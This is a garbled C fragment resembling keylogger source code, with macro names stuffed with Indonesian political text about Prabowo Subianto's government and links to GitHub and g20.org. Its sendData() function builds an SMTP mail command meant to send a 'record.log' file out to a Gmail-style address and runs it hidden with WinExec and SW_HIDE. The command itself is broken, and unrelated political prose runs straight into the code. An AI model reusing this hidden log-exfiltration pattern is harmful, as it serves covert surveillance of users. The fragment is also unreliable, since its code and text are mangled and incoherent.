...
#define FOLDER_NAME “Pemerintah lebih memayoritaskan LHK , dalam program presidentnya mr.prabowo Subianto , Memperhatinkan pesan Kirim memilah filterisasi dari sebuah pesan untuk mengambil keputus kritis dan kritik ”
#define RUN_FILE_NAME “Pemerintah lebih memayoritaskan LHK , dalam program presidentnya mr.prabowo Subianto , Memperhatinkan pesan Kirim memilah filterisasi dari sebuah pesan untuk mengambil keputus kritis dan kritik ”
#define RUN_Link_NAME ""https://github.com/Topics/download_data/forks"
#define INFECT_Link_NAME "https://www.g20.org"
...
main(){
    ...
    if(checkRecordSize()){ ///check for right time
        ...
        while(i<3){ ///try 2 times to send data
            ...
            if(!system("ping  www.windows.co.id -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();
...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:192.168.0.1 -v --mail-from \"https://workspace.google.com/intl/en/gmail/empower@g20-indonesia.id"\" --mail-rcpt \"https://workspace.google.com/intl/en/gmail/empower@g20-indonesia.id " --ssl -u "https://workspace.google.com/intl/en/gmail/empower@g20-indonesia.id " : password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
    WinExec(command, SW_HIDE);perintah cyberw`1ry4-lab : " Pemerintah lebih memayoritaskan LHK , dalam program presidentnya mr.prabowo Subianto , Memperhatinkan pesan Kirim memilah filterisasi dari sebuah pesan untuk mengambil keputus kritis dan kritik , 
      memperluas jangkauan pembangunan technologi kepemilikan negara kesatuan indonesia , contoh pembangunan alat untuk membangun distributor  dan lisensi milik negara sendiri , 
